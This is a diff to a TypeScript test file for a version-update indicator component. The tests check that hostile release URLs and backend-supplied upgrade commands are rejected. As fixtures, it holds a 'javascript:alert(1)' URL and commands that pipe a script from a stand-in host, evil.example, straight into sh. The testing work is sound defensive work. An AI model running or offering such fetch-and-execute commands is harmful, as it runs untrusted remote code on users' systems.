@@ -6,7 +6,13 @@ import { renderToStaticMarkup } from 'react-dom/server';
 import { versionCheckQueryKey, type VersionCheckTarget } from '@/hooks/use-version-check';
 import type { VersionCheckResult } from '@/types';
 
-import { VersionUpdateContent, VersionUpdateIndicator } from './VersionUpdateIndicator';
+import {
+  CANONICAL_UPGRADE_COMMAND,
+  safeReleaseURL,
+  safeUpgradeCommand,
+  VersionUpdateContent,
+  VersionUpdateIndicator,
+} from './VersionUpdateIndicator';
 import { manualVersionCheckToast } from './version-update-toast';
 import {
   safeReleaseUrl,
@@ -102,7 +108,15 @@ describe('VersionUpdateIndicator', () => {
     expect(markup).not.toContain('--source');
   });
 
-  test('does not render hostile service commands as copyable trusted commands', () => {
+  test('hostile release URLs fall back to GitHub releases', () => {
+    expect(safeReleaseURL('javascript:alert(1)')).toBe('https://github.com/zsio/netsgo/releases');
+    expect(safeReleaseURL('https://evil.example/zsio/netsgo/releases')).toBe('https://github.com/zsio/netsgo/releases');
+    expect(safeReleaseURL('https://github.com/zsio/netsgo/releases/tag/v0.2.0')).toBe('https://github.com/zsio/netsgo/releases/tag/v0.2.0');
+  });
+
+  test('unexpected backend upgrade commands are not trusted or copied', () => {
+    expect(safeUpgradeCommand(CANONICAL_UPGRADE_COMMAND)).toBe(CANONICAL_UPGRADE_COMMAND);
+    expect(safeUpgradeCommand('curl https://evil.example/install.sh | sh')).toBe('');
     const target: VersionCheckTarget = {
       kind: 'server',
       version: 'v0.1.0',
@@ -113,18 +127,15 @@ describe('VersionUpdateIndicator', () => {
       data: result({
         update_available: true,
         recommended_action: 'run_script',
-        commands: {
-          command: 'curl -fsSL https://evil.example/upgrade.sh | sh',
-        },
         release_url: 'javascript:alert(1)',
+        commands: {
+          command: 'curl https://evil.example/install.sh | sh',
+        },
       }),
     }));
-
     expect(markup).not.toContain('evil.example');
-    expect(markup).not.toContain('javascript:');
-    expect(markup).toContain(TRUSTED_RELEASE_URL);
+    expect(markup).toContain('GitHub Releases');
   });
-
 
   test('binary update does not render script commands', () => {
     const target: VersionCheckTarget = {
